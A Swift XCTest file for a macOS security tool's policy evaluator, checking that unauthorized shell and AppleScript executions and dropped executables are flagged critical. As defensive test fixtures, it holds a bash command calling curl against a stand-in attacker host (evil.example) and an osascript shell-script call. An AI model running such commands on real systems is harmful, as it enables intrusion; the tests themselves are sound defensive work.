import XCTest
@testable import AppSentinelCore

final class ShellPolicyTests: XCTestCase {
    func testExplicitlyAllowedShellIsNotFlagged() {
        var enrollment: CertificateEnrollmentWindow? = nil
        var policy = SecurityPolicy.empty
        policy.allowedShellExecutables.insert("/bin/zsh")

        let event = SecurityEvent(
            pid: ProcessID(42),
            timestamp: Date(),
            kind: .processExec(path: "/bin/zsh", arguments: ["-c", "echo hi"], sha256: nil)
        )
        let decision = PolicyEvaluator.evaluate(event, policy: policy, enrollment: &enrollment)

        XCTAssertEqual(decision, .allow)
    }

    func testUnauthorizedShellTriggersCriticalBlock() {
        var enrollment: CertificateEnrollmentWindow? = nil
        let event = SecurityEvent(
            pid: ProcessID(42),
            timestamp: Date(),
            kind: .processExec(path: "/bin/bash", arguments: ["-c", "curl evil.example"], sha256: nil)
        )
        let decision = PolicyEvaluator.evaluate(event, policy: .empty, enrollment: &enrollment)

        guard case .critical(let reason) = decision else {
            return XCTFail("expected critical decision, got \(decision)")
        }
        XCTAssertTrue(reason.contains("shell"))
    }

    func testUnauthorizedAppleScriptTriggersCriticalBlock() {
        var enrollment: CertificateEnrollmentWindow? = nil
        let event = SecurityEvent(
            pid: ProcessID(43),
            timestamp: Date(),
            kind: .processExec(path: "/usr/bin/osascript", arguments: ["-e", "do shell script \"whoami\""], sha256: nil)
        )
        let decision = PolicyEvaluator.evaluate(event, policy: .empty, enrollment: &enrollment)

        guard case .critical = decision else {
            return XCTFail("expected critical decision, got \(decision)")
        }
    }

    func testOrdinaryNonShellExecIsAllowedWithoutAnyPolicyEntry() {
        var enrollment: CertificateEnrollmentWindow? = nil
        let event = SecurityEvent(
            pid: ProcessID(44),
            timestamp: Date(),
            kind: .processExec(path: "/Applications/Example.app/Contents/MacOS/Helper", arguments: [], sha256: nil)
        )
        let decision = PolicyEvaluator.evaluate(event, policy: .empty, enrollment: &enrollment)

        XCTAssertEqual(decision, .allow)
    }

    func testNewlyDroppedUnapprovedExecutableIsCritical() {
        var enrollment: CertificateEnrollmentWindow? = nil
        let event = SecurityEvent(
            pid: ProcessID(45),
            timestamp: Date(),
            kind: .executableDropped(path: "/tmp/dropped-payload", sha256: "abc123")
        )
        let decision = PolicyEvaluator.evaluate(event, policy: .empty, enrollment: &enrollment)

        guard case .critical = decision else {
            return XCTFail("expected critical decision, got \(decision)")
        }
    }
}
